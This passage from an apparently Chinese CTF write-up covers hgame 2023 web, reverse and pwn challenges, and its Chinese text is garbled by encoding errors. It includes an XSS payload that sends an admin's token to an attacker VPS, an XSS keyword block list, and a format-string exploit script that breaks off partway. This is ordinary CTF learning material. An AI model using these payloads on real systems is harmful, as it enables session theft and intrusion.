class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.query) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.test(key.trim()) || item.test(req.query[key].trim())) &#123;</span><br><span class="line">        req.query[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.render(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.query &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å‘ç° <code>/button/preview</code> è·¯ç”±å­˜åœ¨XSSæ³¨å…¥ï¼Œå°è¯•XSSè¯·æ±‚ä¼ªé€ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xhr.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;));</span><br><span class="line">url=<span class="string">&quot;http://VPS-IP/x.php?token=&quot;</span>+<span class="built_in">String</span>(xhr.responseText);</span><br><span class="line"><span class="keyword">var</span> xhr2=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr2.open(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">xhr2.send(<span class="string">&quot;token&quot;</span>);</span><br></pre></td></tr></table></figure><p>adminç‚¹å‡»åï¼Œç”Ÿæˆæ­£ç¡®tokenï¼Œå‘é€åˆ°VPSçš„apacheæ—¥å¿—ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[16/Jan/2023:01:01:39 +0800] &quot;GET /x.php?token=&#123;%22token%22:%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3MzgwMjA5OX0.pthLzDWpdJf3vb1pEBZbAknqfCq90xpL4ntnE3wpKdY%22&#125; HTTP/1.1&quot; 200 416 &quot;http://127.0.0.1:9090/&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/109.0.5414.74 Safari/537.36&quot;</span><br></pre></td></tr></table></figure><p>è§£æjwtï¼Œå¾—åˆ°flagï¼š<code>hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;</code>ã€‚</p><p>â€‹</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="before-main"><a href="#before-main" class="headerlink" title="before_main"></a>before_main</h3><p>åœ¨ <code>sub_558AEC339229()</code> ä¸­ä½¿ç”¨ <code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code> æœºåˆ¶å°†base64ç è¡¨ä¿®æ”¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_558AEC339229</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;qword_558AEC33C020, <span class="string">&quot;qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x636D79474568756A</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†è§£ç å³å¯ï¼Œflagï¼š<code>hgame&#123;s0meth1ng_run_befOre_m@in&#125;</code>ã€‚</p><p>â€‹</p><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><blockquote><p>å…”å…”å‡æœŸå‰å­¦ä¹ äº†ç¼–ç¨‹ï¼Œä½ èƒ½çœ‹å‡ºæ¥ä»–å­¦çš„æ˜¯ä»€ä¹ˆè¯­è¨€å—</p></blockquote><p>pythonç¨‹åºé€†å‘ï¼Œä½¿ç”¨pyinstxtractorå°†exeè§£åŒ…å¾—åˆ° <code>stream.pyc</code> æ–‡ä»¶ï¼Œå†ç”¨uncompyle6åç¼–è¯‘ï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: stream.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">key</span>):</span></span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">            tmp = s[i]</span><br><span class="line">            s[i] = s[j]</span><br><span class="line">            s[j] = tmp</span><br><span class="line">            data.append(s[(s[i] + s[j]) % <span class="number">256</span>])</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">Warning: block stack <span class="keyword">is</span> <span class="keyword">not</span> empty!</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(text, gen(key)):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ k)</span><br><span class="line">        result = base64.b64encode(result.encode()).decode()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">text = <span class="built_in">input</span>(<span class="string">&#x27;Flag: &#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;As_we_do_as_you_know&#x27;</span></span><br><span class="line">enc = encrypt(text, key)</span><br><span class="line"><span class="keyword">if</span> enc == <span class="string">&#x27;wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="literal">None</span>(<span class="string">&#x27;try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¯†åˆ«ä¸ºRC4åŠ å¯†ç®—æ³•ï¼Œcyberchefè§£å‡ºflagï¼š<code>hgame&#123;python_reverse_is_easy_with_internet&#125;</code>ã€‚</p><p>â€‹</p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>ç”±äºå…”å…”çš„å­¦æ ¡æå‰æ”¾å‡ï¼Œå¼€å­¦æ‰èƒ½æœŸæœ«è€ƒè¯•ï¼Œäºæ˜¯å…”å…”å¼€å§‹äº†ä»–çš„å¯’å‡æœŸæœ«å¤ä¹ ~</p></blockquote><p>å®é™…ä¸ºè§£éé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„ï¼ŒçŸ©é˜µä¹˜æ³•é€†è¿ç®—ï¼Œè¿™é‡Œä½¿ç”¨z3æ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [<span class="number">126</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">216</span>, <span class="number">253</span>, <span class="number">20</span>, <span class="number">124</span>, <span class="number">232</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">23</span>, <span class="number">100</span>, <span class="number">161</span>, <span class="number">36</span>, <span class="number">118</span>, <span class="number">21</span>, <span class="number">184</span>, <span class="number">26</span>, <span class="number">142</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">186</span>, <span class="number">82</span>, <span class="number">79</span>]</span><br><span class="line">out = [<span class="number">0</span>] * <span class="built_in">len</span>(x)</span><br><span class="line">c = [<span class="number">63998</span>, <span class="number">33111</span>, <span class="number">67762</span>, <span class="number">54789</span>, <span class="number">61979</span>, <span class="number">69619</span>, <span class="number">37190</span>, <span class="number">70162</span>, <span class="number">53110</span>, <span class="number">68678</span>, <span class="number">63339</span>, <span class="number">30687</span>, <span class="number">66494</span>, <span class="number">50936</span>, <span class="number">60810</span>, <span class="number">48784</span>, <span class="number">30188</span>, <span class="number">60104</span>, <span class="number">44599</span>, <span class="number">52265</span>, <span class="number">43048</span>, <span class="number">23660</span>, <span class="number">43850</span>, <span class="number">33646</span>, <span class="number">44270</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">f = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">ff = f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            out[<span class="number">5</span>*i+j] += ff[<span class="number">5</span>*i+k] * x[<span class="number">5</span>*k+j]</span><br><span class="line">        s.add(out[<span class="number">5</span>*i+j] == c[<span class="number">5</span>*i+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[f[i]].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;y0ur_m@th_1s_gO0d&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="VidarCamera"><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h3><blockquote><p>å…”å…”æœ€è¿‘åœ¨å­¦ä¹ Androidå¼€å‘ï¼Œè¿™æ˜¯ä»–æŠ„çš„ç›¸æœºç¨‹åº</p></blockquote><p>apkå†…å…³é”®ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>[] m229encrypthkIa6DI(<span class="keyword">int</span>[] iArr) &#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">4</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">0</span>, <span class="number">2233</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">1</span>, <span class="number">4455</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">2</span>, <span class="number">6677</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">3</span>, <span class="number">8899</span>);</span><br><span class="line">	<span class="keyword">int</span> i2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (i2 &lt; <span class="number">9</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> i3 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> i4 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			i3++;</span><br><span class="line">			i = i2 + <span class="number">1</span>;</span><br><span class="line">			UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; <span class="number">3</span>)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4)));</span><br><span class="line">			UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + i4))));</span><br><span class="line">			i4 = UInt.m393constructorimpl(i4 + <span class="number">878077251</span>);</span><br><span class="line">		&#125; <span class="keyword">while</span> (i3 &lt;= <span class="number">32</span>);</span><br><span class="line">		i2 = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> iArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m230onCreate$lambda0(EditText inputsomething, CameraActivity <span class="keyword">this</span>$<span class="number">0</span>, AlertDialog alertDialog, View view) &#123;</span><br><span class="line">	Intrinsics.checkNotNullParameter(inputsomething, <span class="string">&quot;$inputsomething&quot;</span>);</span><br><span class="line">	Intrinsics.checkNotNullParameter(<span class="keyword">this</span>$<span class="number">0</span>, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">	String obj = inputsomething.getText().toString();</span><br><span class="line">	<span class="keyword">if</span> (obj.length() != <span class="number">40</span>) &#123;</span><br><span class="line">		Toast.makeText(<span class="keyword">this</span>$<span class="number">0</span>, <span class="string">&quot;åºåˆ—å·ä¸æ­£ç¡®&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">		UIntArray.m457setVXSXFK8(m446constructorimpl, i / <span class="number">4</span>, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">1</span>) &lt;&lt; <span class="string">&#x27;\b&#x27;</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span>[] m229encrypthkIa6DI = <span class="keyword">this</span>$<span class="number">0.</span>m229encrypthkIa6DI(m446constructorimpl);</span><br><span class="line">	UInt[] uIntArr = &#123;UInt.m387boximpl(<span class="number">637666042</span>), UInt.m387boximpl(<span class="number">457511012</span>), UInt.m387boximpl(-<span class="number">2038734351</span>), UInt.m387boximpl(<span class="number">578827205</span>), UInt.m387boximpl(-<span class="number">245529892</span>), UInt.m387boximpl(-<span class="number">1652281167</span>), UInt.m387boximpl(<span class="number">435335655</span>), UInt.m387boximpl(<span class="number">733644188</span>), UInt.m387boximpl(<span class="number">705177885</span>), UInt.m387boximpl(-<span class="number">596608744</span>)&#125;;</span><br><span class="line">	<span class="keyword">int</span> i2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> i3 = i2 + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123;</span><br><span class="line">			Toast.makeText(<span class="keyword">this</span>$<span class="number">0</span>, <span class="string">&quot;åºåˆ—å·ä¸æ­£ç¡®&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt; <span class="number">9</span>) &#123;</span><br><span class="line">			alertDialog.dismiss();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			i2 = i3;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é­”æ”¹XTEAåŠ å¯†ï¼Œä¿®æ”¹äº†deltaã€å¼‚æˆ–æ“ä½œå’ŒåŠ å¯†é¡ºæ¬¡ï¼Œè§£å¯†è„šæœ¬åœ¨ç›¸åº”åœ°æ–¹ä¿®æ”¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x34566543</span></span><br><span class="line">    x = delta * <span class="number">33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line">    </span><br><span class="line">c = [<span class="number">0x260202FA</span>, <span class="number">0x1B451064</span>, <span class="number">0x867B61F1</span>, <span class="number">0x228033C5</span>, <span class="number">0xF15D82DC</span>, <span class="number">0x9D8430B1</span>, <span class="number">0x19F2B1E7</span>, <span class="number">0x2BBA859C</span>, <span class="number">0x2A08291D</span>, <span class="number">0xDC707918</span>]</span><br><span class="line">key = [<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    d = decrypt(c[-<span class="number">2</span>:], key)</span><br><span class="line">    flag = long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>] + flag</span><br><span class="line">    c = c[:-<span class="number">2</span>] + [d[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¡¥å…¨flagå¤´ï¼Œflagï¼š<code>hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</code>ã€‚</p><p>â€‹</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><blockquote><p>HINTS:</p><p>æ ¼å¼åŒ–å ä½ç¬¦çš„å€¼æ¥è‡ªäºå‡½æ•°çš„å‚æ•°ï¼ŒåŒæ—¶64ä½ç¨‹åºä¼ å‚ä¸æ˜¯åªç”¨å¯„å­˜å™¨çš„å“¦</p><p>%nå ä½ç¬¦æ˜¯å­˜åœ¨æº¢å‡ºçš„</p></blockquote><p>æ‰“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«æ³„éœ²æ ˆåœ°å€å’Œ <code>__libc_start_main()</code> åœ°å€æ±‚å¾—libcåŸºåœ°å€ï¼Œå†ç”¨one_gadgetæ‰“å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.send(p64(stack_addr)*<span class="number">0x20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%45$p%4418c%8$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+r.recv(<span class="number">12</span>))-<span class="number">243</span></span><br><span class="line">libc_base = libc_start_main - 